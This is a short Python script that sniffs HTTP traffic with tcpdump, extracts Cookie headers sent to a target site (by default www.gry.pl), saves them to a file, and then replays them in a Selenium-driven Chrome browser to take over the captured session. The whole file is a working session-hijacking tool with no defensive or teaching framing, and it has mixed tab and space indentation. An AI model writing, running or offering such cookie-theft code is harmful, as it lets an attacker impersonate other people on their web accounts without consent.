import argparse
import sys
import subprocess
import re
import selenium.webdriver
import time



def listenCookie(host):
	p = subprocess.Popen(('sudo', 'tcpdump', '-A', 'dst', host), stdout=subprocess.PIPE)
	file = open("session.txt", 'w')
	for row in iter(p.stdout.readline, 'b'):
		line = str(row.rstrip())
		matchCookie = re.search('(?<=^Cookie: ).*', line)
		if matchCookie:
			cookieAll = matchCookie.group(0)
			cookieArray = cookieAll.split('; ')
			for cookie in cookieArray:
				file.writelines(cookie+'\n') 
			file.close()
			break

def setCookie(text,host,timeSleep):
	lines = open(text).read()
	driver = selenium.webdriver.Chrome(executable_path="/home/konrad/sterowniki/chromedriver")
	driver.get('http://'+host)
	driver.delete_all_cookies()
	for line in lines.split('\n'):
		if(line):
			array = line.split('=')
			name = array[0]
			value = array[1]
			driver.add_cookie({"name": name, 'value': value})
	driver.get('http://'+host)
	time.sleep(float(timeSleep))

if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("--load", help="load session from file", action="store_true")
	parser.add_argument("--listen", help="listen new sessions", action="store_true")
	parser.add_argument("-f", help="file path", default="session.txt")
	parser.add_argument("-host", help="listen host", default="www.gry.pl")
	parser.add_argument("-time", help="running time", default=20)
	
	if len(sys.argv) < 2:
		parser.print_help()
        	sys.exit(1)
	args = parser.parse_args()
	if args.load:
	        setCookie(args.f, args.host, args.time)
    	if args.listen:
		listenCookie(args.host)
